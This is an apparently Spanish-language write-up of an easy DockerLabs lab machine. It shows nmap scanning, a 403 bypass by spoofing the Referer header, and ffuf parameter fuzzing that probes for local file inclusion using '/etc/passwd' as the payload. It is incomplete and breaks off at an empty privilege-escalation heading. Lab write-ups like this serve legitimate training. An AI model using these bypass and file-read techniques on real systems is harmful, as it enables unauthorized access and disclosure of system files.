Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags:
## Reconocimiento

Comienzo con un ping para comprobar conectividad:
```bash
> ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=1.13 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 1ms
rtt min/avg/max/mdev = 1.131/1.131/1.131/0.000 ms
```

Procedo a realizar un escaneo con nmap para ver que puertos están abiertos:
```bash
> nmap -p- -sS --open -Pn -n --min-rate 5000 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
MAC Address: E2:21:3D:14:26:FA (Unknown)
```
- Puerto 80 HTTP

Realizo un segundo escaneo sobre el puerto abierto para ver la versión y el servicio que esta corriendo: 
```bash
> nmap -p 80 -sC -sV -sS -Pn -n --min-rate 5000 -sS 172.17.0.2 -oN target.txt
------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: E2:21:3D:14:26:FA (Unknown)
```

## Enumeración

**Puerto 80 HTTP**
- Nos encontramos con un dominio raro, que no lleva a nada por lo cual lo metemos al /etc/hosts
- bypass403.pw
![](../assets/Pasted%20image%2020251111232350.png)

**bypass403.pw**
Cuando accedemos al recurso, podemos ver que nos da un 403 Forbidden
![](../assets/Pasted%20image%2020251111232421.png)

## Explotación


Vamos a tratar de bypassear el 403 Forbidden haciendo uso de las cabeceras `Refer` y `Host`

Primero interceptamos la petición con burpsuite y agregamos una nueva cabecera
- `Referer: http://bypass403.pw` - Esto lo que hace es engaña al servidor para que piense que se hizo una petición a si mismo.
```http
GET / HTTP/1.1
Host: bypass403.pw
Referer: http://bypass403.pw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

La petición nos da como resultado esto:
- Al parecer conseguimos bypassear el 403
![](../assets/Pasted%20image%2020251111232852.png)

Ahora, podemos aplicar fuzzing, en este caso yo hice fuzzing de parámetros con `ffuf` para ver si existía algún parametro vulnerable que me permitiera volcar los archivos mediante un LFI.
```bash
> ffuf -w directory-list-2.3-medium.txt -u "http://bypass403.pw/?FUZZ=/etc/passwd" -H "Referer: http://bypass403.pw" -fw 496
pages                   [Status: 200, Size: 888, Words: 3, Lines: 20, Duration: 690ms]
```
## Escalada de Privilegios